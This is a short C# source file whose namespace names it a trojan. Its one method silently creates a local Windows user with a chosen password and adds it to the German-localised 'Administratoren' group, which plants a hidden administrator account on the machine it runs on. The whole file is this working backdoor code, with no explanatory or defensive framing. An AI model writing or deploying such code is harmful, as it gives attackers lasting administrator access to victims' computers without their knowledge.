using System;
using System.DirectoryServices;

namespace DNAV_Trojaner
{
    class User
    {
        public static void Create(string username, string password)
        {
            DirectoryEntry AD = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer");
            DirectoryEntry NewUser = AD.Children.Add(username, "user");
            NewUser.Invoke("SetPassword", new object[] { password });
            NewUser.Invoke("Put", new object[] { "Description", "Test User from .NET" });
            NewUser.CommitChanges(); // -> Hängt sich hier auf, wenn es den Benutzer schon gibt.
            DirectoryEntry grp;
            grp = AD.Children.Find("Administratoren", "group"); 
            if (grp != null) { grp.Invoke("Add", new object[] { NewUser.Path.ToString() }); }
        }
    }
}
